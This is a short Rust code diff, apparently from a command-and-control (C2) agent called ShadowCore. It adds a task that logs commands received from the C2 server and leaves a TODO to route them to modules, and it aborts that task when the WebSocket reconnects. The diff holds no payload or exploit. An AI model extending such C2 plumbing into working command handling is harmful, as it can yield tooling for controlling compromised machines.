@@ -93,6 +93,13 @@ impl ShadowCore {
                     }
                 });
 
+                let inbound_proxy = tokio::spawn(async move {
+                    while let Some(msg) = rx_recv_inner.recv().await {
+                        tracing::info!("Received command from C2: {} bytes", msg.len());
+                        // TODO: Route to module registry here
+                    }
+                });
+
                 if let Err(e) = ws.connect(rx_internal, tx_recv_internal).await {
                     tracing::error!("Transport disconnected/failed: {}", e);
                 } else {
@@ -100,6 +107,7 @@ impl ShadowCore {
                 }
                 
                 proxy.abort();
+                inbound_proxy.abort();
                 
                 tracing::info!("WSS reconnecting in {:?}...", backoff);
                 tokio::time::sleep(backoff).await;
